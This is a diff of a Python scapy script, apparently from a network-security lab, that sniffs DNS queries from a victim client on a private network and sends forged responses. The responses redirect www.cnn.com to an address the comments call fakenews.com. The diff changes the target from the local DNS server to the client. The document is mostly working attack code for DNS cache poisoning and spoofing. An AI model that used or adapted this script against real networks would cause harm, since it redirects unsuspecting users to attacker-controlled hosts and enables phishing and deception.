@@ -1,17 +1,18 @@
+#!/usr/bin/env python3
 from scapy.all import *
 import random
 
 # Define the variables
-# This script sniffs all DNS packets coming from the local DNS server,and if the local DNS server asks question about the IP address of www.cnn.com, this script responds to the local DNS server with a forged response which says that the IP address of www.cnn.com is 188.126.71.216, which is the IP address of fakenews.com.
+# This script sniffs all DNS packets coming from the victim client, and if client asks questions about the IP address of www.cnn.com, this script responds to the victim with a forged response which says that the IP address of www.cnn.com is 188.126.71.216, which is the IP address of fakenews.com.
 TARGET_HOSTNAME = "www.cnn.com"
 FAKE_IP = "188.126.71.216"  # Replace with the desired fake IP address
-DNS_SERVER_IP = "10.0.2.5"  # Replace with the actual DNS server IP
+DNS_CLIENT_IP = "10.0.2.4"  # Replace with the actual DNS client IP
 ATTACKER_IP = "10.0.2.6"  # Replace with the attacker's IP address (fake authoritative NS)
 FAKE_TTL = 19000  # TTL value to set for spoofed response
 
 # DNS Query filter
 def dns_filter(packet):
-    return DNS in packet and packet[DNS].qr == 0 and packet[IP].src == DNS_SERVER_IP
+    return DNS in packet and packet[DNS].qr == 0 and packet[IP].src == DNS_CLIENT_IP
 
 # Crafting the DNS response
 def spoof_dns_response(pkt):
@@ -29,5 +30,5 @@ def spoof_dns_response(pkt):
         print(f"[+] Spoofed DNS response sent to {pkt[IP].src}")
 
 # Start sniffing and apply the filter for DNS queries
-sniff(filter=f"src host {DNS_SERVER_IP} and udp port 53", prn=spoof_dns_response, store=0)
+sniff(filter=f"src host {DNS_CLIENT_IP} and udp port 53", prn=spoof_dns_response, store=0)
 
